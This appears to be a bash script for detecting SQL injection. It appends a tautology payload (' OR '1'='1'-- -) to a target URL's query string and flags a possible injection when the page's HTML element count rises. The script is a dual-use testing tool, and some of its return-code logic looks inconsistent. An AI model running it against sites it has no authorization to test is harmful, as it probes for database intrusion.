#!/bin/bash
# SQL Injection Element Count Checker - Simplified

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
THRESHOLD_PERCENT=10
TIMEOUT=10
vulnerable=0
# Show help
show_help() {
    echo "SQL Injection Detector - Element Count Analysis"
    echo "Usage: $0 [OPTIONS] <URL>"
    echo
    echo "Options:"
    echo "  -u, --url <URL>          Test URL (required)"
    echo "  -p, --payload <PAYLOAD>  Custom SQL payload"
    echo "  -t, --threshold <NUM>    Percentage threshold (default: 10)"
    echo "  -H <header>              Add custom HTTP header"
    echo "  -h, --help               Show this help"
    echo
    echo "Example: $0 -u \"https://example.com/page?id=1\""
}

# Simple curl function
curl_simple() {
    local url="$1"
    local header="${2:-}"
    
    if [[ -n "$header" ]]; then
        curl -s -L --max-time "$TIMEOUT" -H "$header" "$url"
    else
        curl -s -L --max-time "$TIMEOUT" "$url"
    fi
}

# Count HTML elements
count_elements() {
    echo "$1" | grep -o '<[^>]*>' | wc -l
}

# Check specific pattern changes
check_patterns() {
    local baseline="$1"
    local attack="$2"
    
    patterns=("product" "item" "row" "record" "entry" "<div>" "<tr>" "<li>" "<img " "href=" "<pre>")
    
    for pattern in "${patterns[@]}"; do
        b=$(echo "$baseline" | grep -c "$pattern")
        a=$(echo "$attack" | grep -c "$pattern")
        
        if [[ $b -ne $a ]]; then
            echo "  $pattern: $b → $a (+$((a - b)))"
        fi
    done
}

# Main detection function
detect_sqli() {
    local url="$1"
    local payload="${2:-"' OR '1'='1'-- -"}"
    local header="${3:-}"
    
    echo -e "${YELLOW}Testing: $url${NC}"
    echo "Payload: $payload"
    
    # Get baseline
    baseline=$(curl_simple "$url" "$header")
    baseline_count=$(count_elements "$baseline")
    
    # Encode payload and create test URL
    encoded=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g')
    
    if [[ "$url" == *"?"* ]]; then
        test_url="${url}${encoded}"
    else
        test_url="${url}?test${encoded}"
    fi
    
    # Get response with payload
    attack=$(curl_simple "$test_url" "$header")
    attack_count=$(count_elements "$attack")
    
    # Calculate percentage change
    if [[ $baseline_count -eq 0 ]]; then
        echo "Error: No HTML elements found in baseline"
        return 1
    fi
    
    increase=$(( (attack_count - baseline_count) * 100 / baseline_count ))
    
    # Check for vulnerability
    if [[ $attack_count -gt $baseline_count ]] && [[ $increase -ge $THRESHOLD_PERCENT ]]; then
        echo -e "${RED}[VULNERABLE] ⚠️ SQL INJECTION DETECTED!${NC}"
        echo "URL: $url"
        echo "Payload: $payload"
        echo "Element increase: ${increase}% (${baseline_count} → ${attack_count})"
        echo -e "${BLUE}  Reason:${NC} The number of significant elements have increased during testing"
        echo
        echo "Pattern changes:"
        check_patterns "$baseline" "$attack"
        vulnerable=true
        return 1
    else
        echo "No significant element count change (${increase}%)"
        return 0
    fi
}

# Main execution
main() {
    local url=""
    local payload="' OR '1'='1'-- -"
    local header=""
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -u|--url)
                url="$2"
                shift 2
                ;;
            -p|--payload)
                payload="$2"
                shift 2
                ;;
            -t|--threshold)
                THRESHOLD_PERCENT="$2"
                shift 2
                ;;
            -H)
                header="$2"
                shift 2
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                # Assume it's a URL if not already set
                if [[ -z "$url" ]]; then
                    url="$1"
                fi
                shift
                ;;
        esac
    done
    
    # Validate input
    if [[ -z "$url" ]]; then
        echo "Error: URL is required"
        show_help
        exit 1
    fi
    
    # Run detection
   if detect_sqli "$url" "$payload" "$header"; then
    exit 0
    else
        exit 1
    fi
}

# Run if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi